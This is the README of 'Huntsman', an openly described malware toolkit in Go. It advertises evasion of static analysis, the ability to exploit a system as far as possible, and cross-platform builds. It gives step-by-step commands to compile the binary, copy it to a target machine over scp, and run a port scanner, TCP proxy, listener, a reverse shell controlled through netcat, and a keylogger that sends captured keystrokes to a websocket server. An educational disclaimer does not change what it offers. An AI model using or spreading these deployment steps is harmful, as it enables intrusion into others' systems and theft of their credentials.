# Huntsman
A versatile and highly concurrent malware written in Golang.  
https://souvikhaldar.github.io/huntsman/

![](huntsman-main.jpg)
*NOTE* - This software is built for educational purposes. I'm not responsible for any kind of loss/inconvienience caused to anyone using this software.
# Abstract
The term Malware is a portmanteau for Malicious Software, which is software that is used to harm or exploit any electronic device or network, causing chaos. 
Programming is a way of writing down thoughts and logic such that computers can understand. While writing programs, there is always a chance of introducing errors and flaws or failing to consider potentially dangerous scenarios. These flaws in the program are called vulnerabilities. Hackers exploit these bugs to make it behave in a way the programmer never intended. Hackers use malware to achieve this goal. Hence, writing malware is the art of exploiting an error in thinking. 
Huntsman is a malware, which was created with speed and efficiency in mind because at the end of the day malware is still a type of software, albeit a malicious one.
Huntsman in written in a language called Golang. 

## Hunsman Highlights

* Fast and concurrent: Our CPUs are not getting any faster; Moore’s law is dead. We can imrpove processing speeds by reducing the latency introduced by I/O operations. We do this by adding more and more cache memory and using multiple CPUs instead of one. There is a a limit, however, to how large the cache can be and how many cores can be added. Software can be made faster by concurrently running pieces of a process (called threads). Golang takes care of this aspect well, making Huntsman an efficient and concurrent software.  

* Single executable binary: Once you find a vulnerability in a system and want to exploit it using malware, you need to minimize the time it takes to get the malware to the target system. Having only one binary that can be executed on the system is very useful; you just place it there and start exploiting, no dependencies involved!

* Cross-platform: The target system can be of any architecture and be running any operating system, so cross-platform support is a huge plus. Because Huntsman is built using Golang, it can quickly be compiled to run on nearly any platform.

* Versatile: Huntsman is a versatile malware that can perform many kinds of malicious activities. Huntsman's goal is simple: to be able to exploit a system to the maximum degree possible. See [features](#features).

* Static analysis proof: A program written in Golang is very hard to reverse engineer, and hence it is largely safe from static malware analysis. This makes Huntsman difficult to detect.  


# Complete guide
[1.Installation](#installation)   
[2.Reverse shell](#reverse-shell)  
[3.Concurrent port scanning](#fast-concurrent-port-scanning)    
[4.TCP proxy](#run-a-tcp-proxy)   
[5.TCP Listener](#run-a-tcp-listener)   
[6.Keylogger](#keylogger)



# Inspiration
The inspiration of this tool are primarily the following two sources:
1. Pursuing [Advanced Exercutive Program in Cyber Security and Cyber Defense](https://talentsprint.com/pages/wip/iit-kanpur/v2.5/index.html) at the esteemed [c3i](https://security.cse.iitk.ac.in/) institution of [IIT Kanpur](https://www.iitk.ac.in/) and Professors [Sandeep Shukla](https://www.cse.iitk.ac.in/users/sandeeps/), [Rohit Negi](https://www.linkedin.com/in/rohit-negi-02856227/) and [Anand Handa](https://www.linkedin.com/in/anand-handa-391a61107/), who helped take baby steps in cyber security world.  
2. The excellent book [Black Hat Go: Go Programming For Hackers and Pentesters](https://www.amazon.in/Black-Hat-Go-Programming-Pentesters-ebook/dp/B073NPY29N) by Tom Steele, Chris Patten and Dan Kottmann. 



# Roadmap
- [x] Port scanner    
- [x] HTTP traffic analyzer
- [x] TCP proxy    
- [x] TCP listener  
- [x] HTTP server  
- [x] Reverse Shell
- [x] Keylogger  
- [ ] SMB and NTLM expotation  
- [ ] Abusing Databases  
- [ ] Packet processing  
- [ ] Fuzzing and shellcode  
- [ ] Cryptography  
- [ ] Windows system analysis  
- [ ] steganography  
- [ ] CNC RAT  



# Complete Guide
		

## Installation
There multiple ways in which you can install `huntsman` on your machine or a target machine.  

### Option 1: Install it using golang compiler using `go install` or `go build`
	
	1. [Install Golang](https://golang.org/doc/install)    
	2. `git clone git@github.com:souvikhaldar/huntsman.git`
	3. `cd huntsman`  
	4. `go install`  
### Option 2: Download the binary from RELEASES and save it on on `$PATH`.  
### Option 3: Use the `goinstaller.py` script.  
	```
	./goinstaller.py --help 
	Install go program for multiple OS and multiple architectures
	Run goinstaller.py --help for all options
	usage: goinstaller.py [-h]
			      [--os {all,popular,linux,darwin,windows,dragonfly,android,freebsd,netbsd,openbsd,plan9,solaris,aixjs}]
			      [--arch {all,popular,amd64,386,arm,ppc64,arm64,ppc64le,mips,mipsle,mips64,mips64le,s390x}]
			      [--source SOURCE] [--target TARGET]

	optional arguments:
	  -h, --help            show this help message and exit
	  --os {all,popular,linux,darwin,windows,dragonfly,android,freebsd,netbsd,openbsd,plan9,solaris,aixjs}
				The target OS. Eg. all,linux,darwin,windows,etc
	  --arch {all,popular,amd64,386,arm,ppc64,arm64,ppc64le,mips,mipsle,mips64,mips64le,s390x}
				The target's architecture. Eg. all,amd64,386,etc
	  --source SOURCE       The directory where source source is present
	  --target TARGET       The target dir where the binary needs to be stored
	```

	Eg. Compiling for **popular** OSes like Windows, Microsoft and Linux for 64-bit architecture can be done using
	`./goinstaller.py --target ./download --os popular --arch amd64`
### Using docker
You can run `huntsman` in docker as well.  
`docker pull souvikhaldar/huntsman:0.6`

### Transfer to a target
Once you've compiled Huntsman for the target OS and arch, you can transfer it 
using `scp` or any tool of choice:  
Eg, transfering linux binary to target machine:  
`scp ./download/linux_amd64 username@address:location`

# Features

## Fast concurrent port scanning  
``` 
huntsman portscan --help                                                                                    SIGINT(2) ↵  5295  10:30:46
Concurrently scan the provided range (by default 0 to 65535) to check if any port is open

Usage:
  huntsman portscan [flags]

Flags:
  -e, --end int32       last port number (default 65535)
  -h, --help            help for portscan
  -s, --start int32     starting port number (default 1)
      --target string   IP/URL address of the machine to be scanned
  -t, --threads int32   the number of goroutines to execute at a time (default 100)

```

Example:  
`huntsman portScan --target abc.com`  


## Run a TCP proxy

`huntsman proxy -s <local-port> -t <target-address> -p <target-port>`   

## Run a TCP listener

`huntsman listen --port=<port>`


## Reverse shell
First, compile the binary for the target machine and transfer it using the methods described in [installation](#installation). Then, execute it using 
`./<binary-name> reverseshell --port <port-number>` 
Now the listener is running to which you will be sending instructions to execute.   

We will be using [netcat](http://netcat.sourceforge.net/) as the client for sending the commands over the network.  
`nc <address-of-target> <port-number>`  
[Youtube link for the video demonstration](https://youtu.be/eE0k0GVZXyc)

## Keylogger 
A keylogger can log the keystrokes made by a user, typically on a web server. The logged keystrokes often contain important user credentials. 
`huntsman keylogger -w <websocket server address> -l <listener port>`
Ex. `huntsman keylogger -w localhost:8192 -l 8192`   

This video is the demonstration for using huntsman as a keylogger. [Link to youtube video](https://youtu.be/BoPICq1MVhA)



